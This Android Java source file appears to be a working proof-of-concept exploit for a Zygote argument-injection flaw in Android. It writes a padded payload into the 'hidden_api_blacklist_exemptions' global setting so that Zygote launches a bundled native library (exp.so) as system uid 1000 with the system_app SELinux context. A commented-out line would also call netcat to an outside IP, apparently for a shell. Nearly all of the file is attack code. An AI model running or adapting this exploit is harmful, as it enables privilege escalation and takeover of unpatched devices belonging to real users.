package com.fh.exp31317;

import android.content.ContentValues;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "FH";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        String Payload = Get_Payload();
//        String pay_load = "test";
//        Log.d(TAG, pay_load);
        Button button = findViewById(R.id.button1);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d(TAG, String.valueOf(Build.VERSION.SDK_INT));
                ContentValues values = new ContentValues();
                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values.put(Settings.Global.VALUE, Payload);
                try {
                    getContentResolver().insert(Uri.parse("content://settings/global"), values);
                } catch (Exception e) {
                    Log.d(TAG, "Wirte Global error:"+e.getMessage());
                    e.printStackTrace();
                }
            }
        });

        Button button2 = findViewById(R.id.button2);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d(TAG, String.valueOf(Build.VERSION.SDK_INT));
                ContentValues values = new ContentValues();
                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values.put(Settings.Global.VALUE, "*");
                try {
                    getContentResolver().insert(Uri.parse("content://settings/global"), values);
                } catch (Exception e) {
                    Log.d(TAG, "Wirte Global error:"+e.getMessage());
                    e.printStackTrace();
                }
            }
        });
    }
    String Get_Payload() {
        String Payload = "";
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R){
//            return "1111";
            for (int i = 0; i != 3000; ++i) {
                Payload += "\n";
            }
            for (int i = 0; i != 5157; ++i) {
                Payload += "A";
            }
            String packageCodePath = getPackageCodePath();
            Payload += "12\n" +
                    "--runtime-args\n" +
                    "--invoke-with\n" +
//                    "nc 10.11.35.202 9981;\n" +
                    packageCodePath.substring(0, packageCodePath.length() - 8)+"lib/arm64/exp.so;\n" +
                    "--setuid=1000\n" +
                    "--setgid=1000\n" +
                    "--runtime-flags=43267\n" +
                    "--target-sdk-version=29\n" +
                    "--nice-name=com.fh.exp31317\n" +
                    "--app-data-dir=/data/user/0/com.fh.exp31317\n" +
                    "--package-name=com.fh.exp31317\n" +
                    "--seinfo=platform:system_app:targetSdkVersion=29:complete\n" +
                    "android.app.ActivityThread" +
                    ",";
            for (int i = 0; i != 1400; ++i) {
                Payload += "\n,";
            }
            return Payload;

        }else {
            String packageCodePath = getPackageCodePath();
            Payload = "LClass1;->method1(\n" +
                    "12\n" +
                    "--runtime-args\n" +
                    "--invoke-with\n" +
//                    "nc 10.11.35.202 9981;\n" +
                    packageCodePath.substring(0, packageCodePath.length() - 8)+"lib/arm64/exp.so;\n" +
                    "--setuid=1000\n" +
                    "--setgid=1000\n" +
                    "--runtime-flags=43267\n" +
                    "--target-sdk-version=29\n" +
                    "--nice-name=com.fh.exp31317\n" +
                    "--app-data-dir=/data/user/0/com.fh.exp31317\n" +
                    "--package-name=com.fh.exp31317\n" +
                    "--seinfo=platform:system_app:targetSdkVersion=29:complete\n" +
                    "android.app.ActivityThread";
            return Payload;
        }
    }
}